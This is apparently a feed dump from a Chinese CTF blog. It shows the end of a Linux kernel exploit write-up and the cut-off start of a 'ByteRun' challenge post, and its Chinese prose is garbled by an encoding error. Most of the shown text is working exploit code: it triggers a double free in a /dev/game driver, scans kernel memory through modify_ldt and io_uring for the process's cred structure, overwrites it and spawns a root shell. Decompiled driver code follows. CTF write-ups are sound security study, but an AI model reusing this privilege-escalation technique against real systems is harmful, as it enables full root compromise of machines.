class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_32bit : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> contents : <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> read_exec_only : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> limit_in_pages : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_not_present : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> useable : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lm : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    signal(SIGINT, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *info = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> search_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> *result;</span><br><span class="line">    <span class="keyword">uint64_t</span> cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/game&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed open /dev/game&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] construct double free! \033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init_uring();</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, buf);</span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=aaaaaaaaa&quot;</span>); <span class="comment">// context-&gt;cur[0] = object(0x10);</span></span><br><span class="line">    read(fd, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = *(<span class="keyword">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap_addr : \033[0m %p\n&quot;</span>, heap_addr);</span><br><span class="line">    ioctl(fd, <span class="number">1</span>, buf);                 <span class="comment">// context-&gt;prv[0] = object(0x10);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x72</span>, <span class="string">&quot;flag=bbbbbbbbb&quot;</span>); <span class="comment">// kfree(context-&gt;cur[0]);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc)); <span class="comment">// context-&gt;prev[0] = object(0x10) == ldt_struct;</span></span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x16</span>, buf); <span class="comment">// double free     kfree(object(ldt_struct));</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] search cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    register_tag(&amp;ring, buf, <span class="number">2</span>);</span><br><span class="line">    search_addr = heap_addr &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr - i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; i % <span class="number">0x200</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] looked up range from \033[0m %p ~ %p\n&quot;</span>, search_addr - i * <span class="number">0x1000</span>, search_addr + i * <span class="number">0x1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr - (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">        ldt.entries = search_addr + i * <span class="number">0x1000</span>;</span><br><span class="line">        ldt.nr_entries = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring, &amp;ldt, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fork())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">if</span> (res != <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;read_ldt failed!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x18</span>);</span><br><span class="line">                <span class="keyword">if</span> ((real_cred &amp; <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">                &#123;</span><br><span class="line">                    target_addr = search_addr + (i * <span class="number">0x1000</span>) + (result - buf);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found task_struct : \033[0m %p\n&quot;</span>, target_addr);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] found cred : \033[0m %p\n&quot;</span>, real_cred);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    real_cred = <span class="number">-1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[-]\033[0m cannot rehint cred\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;real_cred, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (real_cred != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] write cred!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff1000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x1000</span> / <span class="number">4</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    register_tag(&amp;ring1, buf, (<span class="number">0x1000</span> / <span class="number">8</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = real_cred + <span class="number">4</span> + <span class="number">8</span> * i;</span><br><span class="line">        update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = <span class="number">0</span>;</span><br><span class="line">        read(fd, info, <span class="number">9</span>);</span><br><span class="line">        update_tag(&amp;ring1, buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = search_addr + <span class="number">0x3000000</span>;</span><br><span class="line">    update_tag(&amp;ring, buf, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] write Done \033[0m&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230420164729825.png"                      alt="image-20230420164729825"                ></p><hr><p>å‚è€ƒé“¾æ¥:</p><p>â€‹    <a class="link"   href="https://blog.rois.io/2022/rctf-2022-official-write-up/" >https://blog.rois.io/2022/rctf-2022-official-write-up/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v6.0.12/source" >https://elixir.bootlin.com/linux/v6.0.12/source<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896" >https://github.com/axboe/liburing/tree/d6527ac94c1bb2a2551b45899b23e8d256c3f896<i class="fas fa-external-link-alt"></i></a></p><p>é¢˜ç›®é“¾æ¥:</p><p>â€‹    XCTFä¸­å¯ä»¥ä¸‹è½½</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ç›®å‰å„ç§æ¯”èµ›çš„å„ç§èµ›åˆ¶çœŸçš„æ˜¯è®©äººååˆ†éš¾å—ï¼Œä»¥è‡³äºæ„Ÿè§‰è‡ªå·±ä¸æ€ä¹ˆé€‚åˆæ‰“æ¯”èµ›äº†ã€‚æ‰€ä»¥æ‰“ç®—é™ä¸‹å¿ƒæ¥å¤ç°ä¸€åœºæ¯”èµ›ï¼Œåœ¨RCTFä¸­æ‰¾åˆ°åˆ†å€¼æœ€ä½çš„ä¸€é“é¢˜ã€‚</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="io_uring" scheme="https://196082.github.io/tags/io-uring/"/>
    
    <category term="modify_ldt" scheme="https://196082.github.io/tags/modify-ldt/"/>
    
  </entry>
  
  <entry>
    <title>ByteRunå¤ç°</title>
    <link href="https://196082.github.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/"/>
    <id>https://196082.github.io/2023/04/01/ByteRun%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-01T07:05:48.000Z</published>
    <updated>2023-04-01T07:05:25.085Z</updated>
    
    <content type="html"><![CDATA[<p>å½“åˆçœ‹åˆ°å¢¨æ™šé¸¢å¤§ä½¬çš„åšå®¢å¯¹è¿™é“é¢˜ç›®çš„æè¿°çš„æ—¶å€™å°±å¯¹è¿™é“é¢˜æš—ç”Ÿæƒ…æ„«äº†ï¼Œå¦‚ä»Šç»ˆäºæ˜¯å¾—ä»¥å¤ç°ã€‚</p><h2 id="å†…æ ¸åˆ†æ"><a href="#å†…æ ¸åˆ†æ" class="headerlink" title="å†…æ ¸åˆ†æ"></a>å†…æ ¸åˆ†æ</h2><h3 id="å‡½æ•°åˆ†æ"><a href="#å‡½æ•°åˆ†æ" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h3><p><del>è¿™é“é¢˜ç›®è¦è¯´éš¾ä¹Ÿç®—éš¾ï¼Œè¦è¯´ç®€å•é‚£å°±æ˜¯è¯´å±è¯</del>ã€‚è¿™é“é¢˜å¯ä»¥è¯´æ˜¯ä»é€†å‘å°±å¼€å§‹å˜å¾—ä¸å¯¹åŠ²èµ·æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">bytedev_read</span><span class="params">(__int64 a1, __int64 user_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 a3; <span class="comment">// r14</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v6; <span class="comment">// eax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 *v10; <span class="comment">// r8</span></span><br><span class="line">  __int64 read_size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 remaining_size; <span class="comment">// rbx</span></span><br><span class="line">  __int64 read_chunk_pos; <span class="comment">// r15</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v17; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v19; <span class="comment">// eax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rbx</span></span><br><span class="line">  _WORD *chunk; <span class="comment">// [rsp+10h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, user_buf);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v5 = v4 + <span class="number">40</span>;</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">40</span>);</span><br><span class="line">  v6 = __indword(*(_QWORD *)(v4 + <span class="number">0x20</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      offset = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(<span class="keyword">unsigned</span> __int16 **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          read_size = v10[<span class="number">1</span>];</span><br><span class="line">          remaining_size = *v10 - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_size;</span><br><span class="line">          read_chunk_pos = (__int64)v10 + read_size + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( remaining_size &gt; a3 )</span><br><span class="line">            remaining_size = a3;                <span class="comment">// current_read_size</span></span><br><span class="line">          <span class="keyword">if</span> ( (remaining_size &amp; <span class="number">0x80000000</span>) != <span class="number">0LL</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          chunk = *(_WORD **)(v7 + <span class="number">8</span> * idx + <span class="number">0x30</span>);</span><br><span class="line">          _check_object_size((<span class="keyword">char</span> *)v10 + read_size + <span class="number">4</span>, remaining_size, <span class="number">1LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( copy_to_user(offset + user_buf, read_chunk_pos, remaining_size) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          a3 -= remaining_size;</span><br><span class="line">          offset += remaining_size;</span><br><span class="line">          v14 = (<span class="keyword">unsigned</span> __int16)(remaining_size + chunk[<span class="number">1</span>]);</span><br><span class="line">          chunk[<span class="number">1</span>] += remaining_size;</span><br><span class="line">          <span class="keyword">if</span> ( (_WORD)v14 == *chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_WORD)v14 != <span class="number">0xFFC</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            kfree(chunk);</span><br><span class="line">            *(_DWORD *)(v7 + <span class="number">0xB0</span>) = (*(_DWORD *)(v7 + <span class="number">0xB0</span>) + <span class="number">1</span>) % <span class="number">0x10</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( a3 )</span><br><span class="line">          &#123;</span><br><span class="line">            idx = *(<span class="keyword">int</span> *)(v7 + <span class="number">0xB0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)idx != *(_DWORD *)(v7 + <span class="number">0xB4</span>) )</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(&amp;unk_F90);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_1038);</span><br><span class="line">LABEL_21:</span><br><span class="line">    raw_spin_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v16 = <span class="number">0x200</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x200</span> )</span><br><span class="line">    v16 = a3;</span><br><span class="line">  v17 = *(_QWORD *)(v15 + <span class="number">0x20</span>);</span><br><span class="line">  v18 = __indword(v17);</span><br><span class="line">  <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = __indword(v17 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v19 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = *(_QWORD *)(v15 + <span class="number">0x18</span>);</span><br><span class="line">      _check_object_size(v20, v16, <span class="number">1LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( copy_to_user(user_buf, v20, v16) )</span><br><span class="line">        printk(&amp;unk_1010);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_FF0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  bytedev_read_cold_14();</span><br><span 